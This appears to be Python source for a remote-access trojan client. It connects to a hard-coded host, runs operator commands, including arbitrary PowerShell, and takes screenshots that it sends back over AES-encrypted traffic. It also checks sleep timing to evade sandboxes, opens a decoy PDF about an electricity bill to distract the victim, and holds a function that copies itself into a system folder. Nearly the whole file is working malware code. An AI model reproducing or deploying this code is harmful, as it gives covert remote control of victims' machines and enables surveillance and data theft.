import socket
import sys
import os
import asyncio
import base64
import mss
import struct
import shutil
import time
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import requests

def check_sleep_integrity():
        start = time.time()
        time.sleep(5)
        elapsed = time.time() - start
        if elapsed < 4.5:
            print("[!] Sleep manipulado: entorno sospechoso.")
            sys.exit(1)
class AsyncClient:
    def __init__(self, host='192.168.1.196', port=4422):
        self.host = host
        self.port = port
        

    async def connect(self):
        reader, writer = await asyncio.open_connection(self.host, self.port)
        # self.moving()
        current_dir = os.getcwd()
        res_dir = current_dir.encode("utf-8")
        print(res_dir)
        writer.write(res_dir)  
        while True:
            try:
                data = await reader.read(1024)

                decrypted_response = self.decrypt(data)
                command = decrypted_response.decode()
                print(f"Comando recibido: {command}")
                if command.startswith("cd "):
                    path = command[3:]
                    if os.path.exists(path) and os.path.isdir(path):
                        os.chdir(path)
                        current_dir = os.getcwd()   
                        encrypt = self.encrypt(current_dir)  
                        writer.write(encrypt)
                        await writer.drain()  
                        print(current_dir)
                elif command.startswith("ls") or command.startswith("dir"):
                        path = os.getcwd() 
                        dir_list = ""
                        p =  os.listdir(path) 
                        if p != []:               
                            for command in os.listdir(path):
                                if command != 0:
                                    dir_list += command + '\\n'
                        else:
                            dir_list = "No Result."
                        encrypt = self.encrypt(dir_list)  
                        writer.write(encrypt)
                        res = await reader.read(1024)
                        decrypted_response = self.decrypt(res)
                        result = os.getcwd()
                        result_encrypt = self.encrypt(result) 
                        writer.write(result_encrypt)
                elif command.startswith("mkdir"):
                    try:
                        os.makedirs(command[6:])   
                        resp_send = "Archive create with success"
                        encrypt = self.encrypt(resp_send)                       
                        writer.write(encrypt)
                        resp_read = await reader.read(1024)
                        decrypted_response = self.decrypt(resp_read)
                        result = os.getcwd()
                        encrypt_result_dir = self.encrypt(result)   
                        writer.write(encrypt_result_dir)
                    except FileExistsError:
                        pass
                elif command.startswith("capture"):
                    try:

                        self.captura_pantalla() 
                        
                        with open('monitor-1.png', 'rb') as f:
                            raw_data = f.read()
                            encoded_data = base64.b64encode(raw_data)
                            
  
                            header = struct.pack("!I", len(encoded_data))
                            writer.write(header)
                            

                            writer.write(encoded_data)
                            await writer.drain()  
                        

                        response = await reader.read(1024)
                        if response.decode() != "OK":
                            print("Error en servidor")
                        

                        os.remove("monitor-1.png")
                        await reader.read(1024)
                        result = os.getcwd()
                        writer.write(result.encode("utf-8"))
                    except Exception as e:

                        writer.write(struct.pack("!I", 4)) 
                        writer.write(base64.b64encode(b"fail"))
                        await writer.drain()
                
                elif command.startswith("powershell"):
                    try:
                        ps_command = command[11:] 
                        
                        proc = await asyncio.create_subprocess_shell(
                            f'powershell.exe -Command "{ps_command}"',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.STDOUT
                        )
                        

                        stdout, _ = await proc.communicate()
                        output = stdout.decode('utf-8', errors='replace')
                        if stdout != b'':
                             encrypt = self.encrypt("Comando invalido")
                             writer.write(encrypt)

                        encrypCommandExecuting = self.encrypt("Comando ejecutado correctamente")
                        writer.write(encrypCommandExecuting)
                        res =await reader.read(1024)
                        decrypted_response = self.decrypt(res)
                        result = os.getcwd()
                        encrypt_result = self.encrypt(result) 
                        writer.write(encrypt_result)
                        
                    except Exception as e:
                        error_msg = f"Error PowerShell: {str(e)}"
                        writer.write(error_msg.encode('utf-8'))
                        await writer.drain()
                    else:
                        writer.write(b"Comando incorrecto.")

            except (asyncio.IncompleteReadError, ConnectionResetError, BrokenPipeError):
                            print("Cliente desconectado de forma inesperada.")
                            break
            except Exception as e:
                print(f"Error en el shell: {e}")
                break  

    def captura_pantalla(self):
        screen = mss.mss()
        screen.shot()

    def moving(self):
        archivo_origen = "./Client.py"
        directorio_destino = 'C:\Documentos'

        if not os.path.exists(directorio_destino):
            os.makedirs(directorio_destino)

        archivo_destino = os.path.join(directorio_destino, os.path.basename(archivo_origen))
        shutil.move(archivo_origen, archivo_destino)

        print(f"Archivo movido a: {archivo_destino}")

    def encrypt(self, plaintext: str) -> bytes:
        try:
            key = b"thisis16byteskey"
            nonce = os.urandom(12)
            cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()
            return nonce + encryptor.tag + ciphertext
        except Exception as e:
                print(e)
         
    def decrypt(self, data: str) -> str:
        try:
            key = b"thisis16byteskey"
            raw_data = data  # Decodifica el Base64
            nonce, tag, ciphertext = raw_data[:12], raw_data[12:28], raw_data[28:]

            cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()

            return plaintext
        except Exception as e:
            print(f"Error en descifrado: {e}")
            return None

def getImageAndSave():
    response = requests.get('https://urra.com.co/wp-content/uploads/2021/02/Todo-lo-que-debe-saber-sobre-la-factura-de-energia-electrica-CREG.pdf')
    if( response.status_code == 200):

        with open("pdf.pdf", "wb") as file:
                file.write(response.content)
    else:
        print(f"Error al descargar la imagen: {response.status_code}")    

    os.startfile('pdf.pdf')

if __name__ == "__main__":
    getImageAndSave()
    client = AsyncClient()
    check_sleep_integrity()
    asyncio.run(client.connect())
